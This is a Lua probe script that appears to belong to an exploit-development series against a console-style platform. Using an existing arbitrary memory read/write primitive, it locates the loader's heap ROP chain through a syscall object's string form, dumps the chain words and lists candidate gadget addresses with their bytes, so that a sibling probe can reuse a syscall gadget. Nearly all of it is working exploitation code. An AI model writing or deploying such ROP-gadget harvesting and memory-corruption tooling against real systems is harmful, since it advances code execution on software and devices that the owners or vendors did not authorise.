-- CRASH_CLASS: LOW
-- PROBE 510c: recover the loader's own ROP gadget addresses.
--
-- The Lua syscall path is a ROP chain the loader builds in its heap (42i parsed
-- it).  That chain must contain a `syscall` instruction among its gadget
-- addresses, because every Lua syscall works.  Reading the chain gives us a
-- known-good syscall gadget without scanning, which 510b needs for the child
-- thread's loop.
--
-- Prints the chain words and the distinct addresses outside the heap.

print("=== PROBE 510c: loader chain gadgets ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function q(v)
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) end
    return nil
end
local function zero(buf, n) for o = 0, n - 4, 4 do wd(buf + o, 0) end end

local sc_getpid = make_syscall(20)
local sc_info = make_syscall(593)

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local text_lo, text_hi = rd(info + 0x108), rd(info + 0x10C)
print("[0] eboot text=" .. string.format("0x%08X_%08X", text_hi or 0, text_lo or 0))

local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local ret_str = pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")
print("[0] ropchain=" .. tostring(rop_str) .. " fn_addr=" .. tostring(fn_str) .. " ret_addr=" .. tostring(ret_str))
if not rop_str then
    print("[0] no chain string; pipe_str=" .. pipe_str:sub(1, 200))
    print("=== DONE ===")
    return
end
local rop = uint64(rop_str)
print("[0] first chain word=" .. (rq(rop) and q(rq(rop)) or "unreadable"))

-- prime the chain
pcall(function() return sc_getpid() end)

local seen = {}
local order = {}
for off = 0, 0x2F8, 8 do
    local v = rq(rop + off)
    if v then
        local h, l = get_hi_lo(v)
        print(string.format("  +0x%03X %s", off, string.format("0x%08X_%08X", h, l)))
        -- classify: a gadget address has high 32 bits 0 and a low part above 0x10000
        if h == 0 and l > 0x10000 then
            local key = l
            if not seen[key] then seen[key] = true; order[#order + 1] = l end
        end
    end
end
print("[1] distinct high-0 addresses in chain: " .. #order)
for i = 1, #order do
    local a = order[i]
    local b0, b1, b2, b3 = rb(a), rb(a + 1), rb(a + 2), rb(a + 3)
    print(string.format("    %08X bytes %s %s %s %s", a,
        b0 and string.format("%02X", b0) or "--",
        b1 and string.format("%02X", b1) or "--",
        b2 and string.format("%02X", b2) or "--",
        b3 and string.format("%02X", b3) or "--"))
end
print("=== DONE ===")
